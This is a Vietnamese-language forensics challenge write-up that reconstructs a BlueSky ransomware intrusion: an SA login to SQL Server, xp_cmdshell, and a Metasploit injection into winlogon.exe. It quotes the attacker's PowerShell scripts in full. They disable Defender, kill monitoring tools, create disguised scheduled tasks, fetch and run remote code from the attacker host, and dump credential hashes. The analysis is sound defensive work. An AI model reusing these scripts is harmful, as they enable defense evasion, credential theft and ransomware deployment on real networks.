# Mô tả

A high-profile corporation that manages critical data and services across diverse industries has reported a significant security incident. Recently, their network has been impacted by a suspected ransomware attack. Key files have been encrypted, causing disruptions and raising concerns about potential data compromise. Early signs point to the involvement of a sophisticated threat actor. Your task is to analyze the evidence provided to uncover the attacker’s methods, assess the extent of the breach, and aid in containing the threat to restore the network’s integrity.

# Phân tích

## Q1

**Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?**

`87.96.21.84`

## Q2

**During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?**

Thử tìm qua HTTP thì không thấy, lúc lướt qua TCP stream thì thấy có các packet chứa `MYSQLSERVER` thì nếu muốn tìm người dùng có thể kiểm tra protocol `TDS Tabular Data Steam` để kiểm tra các thao tác với database

Tại packet 2675 có info `login` vào xem thì biết được hacker đã đăng nhập vào tài khoản `sa` với mật khẩu là `cyb3rd3f3nd3r$`

`sa`

## Q3

**We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?**

`cyb3rd3f3nd3r$`

## Q4

**Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?**

Vậy là sau khi đăng nhập được thì hacker đã làm cách gì đó để có được shell, ta có thể lướt đến cuối protocol `TDS` vì sau khi có được shell hacker sẽ không cần truy cập qua database nữa, xem phần data thì biết được đã dùng lệnh gì

`xp_cmdshell`

## Q5

**Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?**

Trong Event log, ta cũng có thể tìm thấy thời điểm hacker đăng nhập thành công, thực hiện `xp_cmdshell` và sau đó thì có một mục khá là đáng nghi

```
Provider "Environment" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=MSFConsole
	HostVersion=0.1
	HostId=1693e66c-ce22-41d0-8356-4245271c31e8
	HostApplication=winlogon.exe
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=
```

Powershell được chạy trong chương trình `winlogon.exe` bởi `MSFConsole`, Powershell thường rất ít được chạy trong đây mà Host của nó lại là `MSFConsole` chắc chắn rằng hacker đã inject Metasploit C2 framework vào `winlogon.exe` rồi

`winlogon.exe`

## Q6

**Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?**

Tại TCP stream 1179 người dùng có gửi một request đến ip của hacker tải về một file `checking.ps1`

```powershell
$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$osver = ([environment]::OSVersion.Version).Major

$WarningPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

$url = "http://87.96.21.84"

Function Test-URL {
    param (
        [string]$url
    )
    
    try {
        $request = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if ($request.StatusCode -eq 200) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

Function Test-ScriptURL {
    param (
        [string]$scriptUrl
    )
    
    try {
        $request = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if ($request.StatusCode -eq 200) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

Function StopAV {

    if ($osver -eq "10") {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    }
    Function Disable-WindowsDefender {

        if ($osver -eq "10") {

            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle" -ErrorAction SilentlyContinue
    

            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle\Java" -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\Windows" -ErrorAction SilentlyContinue
    

            $defenderRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender"
            $defenderRegistryKeys = @(
                "DisableAntiSpyware",
                "DisableRoutinelyTakingAction",
                "DisableRealtimeMonitoring",
                "SubmitSamplesConsent",
                "SpynetReporting"
            )
    

            if (-not (Test-Path $defenderRegistryPath)) {
                New-Item -Path $defenderRegistryPath -Force | Out-Null
            }
    

            foreach ($key in $defenderRegistryKeys) {
                Set-ItemProperty -Path $defenderRegistryPath -Name $key -Value 1 -ErrorAction SilentlyContinue
            }
    

            Get-Service WinDefend | Stop-Service -Force -ErrorAction SilentlyContinue
            Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
    

    $servicesToStop = "MBAMService", "MBAMProtection", "*Sophos*"
    foreach ($service in $servicesToStop) {
        Get-Service | Where-Object { $_.DisplayName -like $service } | ForEach-Object {
            Stop-Service $_ -ErrorAction SilentlyContinue
            Set-Service $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
}


Function CleanerEtc {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
}


Function CleanerNoPriv {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\Users\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237" /sc HOURLY /f /mo 3 /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass C:\Users\del.ps1" | Out-Null
}

$scriptUrl = "http://87.96.21.84/del.ps1"

if (Test-URL -url $url) {
    Write-Host "Connection to $url successful. Proceeding with execution."
    

    if (Test-ScriptURL -scriptUrl $scriptUrl) {
        Write-Host "Script at $scriptUrl is reachable."

        if ($priv) {
            CleanerEtc

            $encodedDiscovery = "SW52b2tlLUV4cHJlc3Npb24gIndob2FtaSI="
            $decodedDiscovery = [System.Convert]::FromBase64String($encodedDiscovery)
            $commandDiscovery = [System.Text.Encoding]::UTF8.GetString($decodedDiscovery)
            powershell -exec bypass -w 1 $commandDiscovery

            Write-Host "Privilege level: SYSTEM"

        } else {
            CleanerNoPriv
            Write-Host "Privilege level: User"
        }
    } else {
        Write-Host "Script at $scriptUrl is not reachable. Terminating."
        exit
    }
} else {
    Write-Host "Connection to $url failed. Terminating."
    exit
}

if ($priv -eq $true) {
    try {
        StopAV
    } catch {}
    Start-Sleep -Seconds 1
    CleanerEtc
} else {
    CleanerNoPriv
}
```

`http://87.96.21.84/checking.ps1`

## Q7

**Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?**

Ngay dòng đầu của `checking.ps1` hacker có tìm 

```powershell
$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
```

`S-1-5-32-544`

## Q8

**Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.**

Trong `checking.ps1` có hàm `StopAV` và `Disable-WindowsDefender`

```powershell
Function StopAV {

    if ($osver -eq "10") {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    }
    Function Disable-WindowsDefender {

        if ($osver -eq "10") {

            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle" -ErrorAction SilentlyContinue
    

            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle\Java" -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\Windows" -ErrorAction SilentlyContinue
    

            $defenderRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender"
            $defenderRegistryKeys = @(
                "DisableAntiSpyware",
                "DisableRoutinelyTakingAction",
                "DisableRealtimeMonitoring",
                "SubmitSamplesConsent",
                "SpynetReporting"
            )
    

            if (-not (Test-Path $defenderRegistryPath)) {
                New-Item -Path $defenderRegistryPath -Force | Out-Null
            }
    

            foreach ($key in $defenderRegistryKeys) {
                Set-ItemProperty -Path $defenderRegistryPath -Name $key -Value 1 -ErrorAction SilentlyContinue
            }
    

            Get-Service WinDefend | Stop-Service -Force -ErrorAction SilentlyContinue
            Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
```

`DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting`

## Q9

**Can you determine the URL of the second file downloaded by the attacker?**

Tại tcp stream 1182 tải file `del.ps` từ server của hacker

```powershell
GET /del.ps1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4291
Host: 87.96.21.84
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.8
Date: Sun, 28 Apr 2024 00:32:12 GMT
Content-type: application/octet-stream
Content-Length: 343
Last-Modified: Sat, 27 Apr 2024 23:16:43 GMT

Get-WmiObject _FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject

$list = "taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
foreach($task in $list)
{
    try {
        stop-process -name $task -Force
    }
    catch {}
}

stop-process $pid -Force
```

`del.ps1` có tác dụng kết thúc các process trong `$list` để tránh việc chúng ghi lại những hành động của hacker và tránh việc các phần mềm độc hại hacker tải về sau đó bị phát hiện

`http://87.96.21.84/del.ps1`

## Q10

**Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?**

Tiếp tục kiểm tra trong `checking.ps1` để biết được hacker đã thực hiện persistence như nào

```powershell
Function CleanerEtc {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
}


Function CleanerNoPriv {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\Users\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237" /sc HOURLY /f /mo 3 /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass C:\Users\del.ps1" | Out-Null
}
```

Option `/tn` là taskname - tên của tác vụ khởi tạo

`\Microsoft\Windows\MUI\LPupdate`

## Q11

**Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?**

File `del.ps1` được tải về và thực thi sau khi hacker đã thực hiện persistence và tắt đi các phần mềm theo dõi hoạt động process trên máy thì có thể nghĩ đến tactic [Defense Evasion](https://attack.mitre.org/tactics/TA0005)

`TA0005`

## Q12

**What's the invoked PowerShell script used by the attacker for dumping credentials?**

Kiểm tra tcp với http stream mệt quá, export hết file từ HTTP ra cho nhàn, file được dùng để dump user creds là `Invoke-PowerDump.ps1`

```powershell
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1')
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-SMBExec.ps1')

$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" | Select-Object -ExpandProperty Content -ErrorAction Stop

$EncodedCommand = "KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vODcuOTYuMjEuODQvSW52b2tlLVBvd2VyRHVtcC5wczEnKSB8IEludm9rZS1FeHByZXNzaW9uDQoNCg==" 
# (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1') | Invoke-Expression

Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedCommand)))


$EncodedExec = "SW52b2tlLVBvd2VyRHVtcCB8IE91dC1GaWxlIC1GaWxlUGF0aCAiQzpcUHJvZ3JhbURhdGFcaGFzaGVzLnR4dCI="
# Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"

Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedExec)))
```

`Invoke-PowerDump.ps1`

## Q13

**Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?**

`Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"`

`hashes.txt`

## Q14

TCP stream 1188

```
GET /extracted_hosts.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4291
Host: 87.96.21.84
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.8
Date: Sun, 28 Apr 2024 00:32:12 GMT
Content-type: text/plain
Content-Length: 72
Last-Modified: Sat, 27 Apr 2024 23:41:36 GMT

Host: 87.96.21.71
Host: 87.96.21.75
Host: 87.96.21.80
Host: 87.96.21.81
```



`extracted_hosts.txt`

## Q15

**After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?**

Stream 1193 có tải file `javaw.exe` đây chính là ransomware được nhắc đến, export về và đưa lên [Virustotal](https://www.virustotal.com/gui/file/3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb/relations) để kiểm tra

```
GET /javaw.exe HTTP/1.1
Host: 87.96.21.84
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.8
Date: Sun, 28 Apr 2024 00:32:14 GMT
Content-type: application/x-msdos-program
Content-Length: 72704
Last-Modified: Fri, 26 Apr 2024 08:44:02 GMT
```

Trong mục `Dropped Files` sẽ có ransome note

`# DECRYPT FILES BLUESKY #`

## Q16

**In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?**

Xem mục `Family labels` trên Virustotal

`BlueSky`
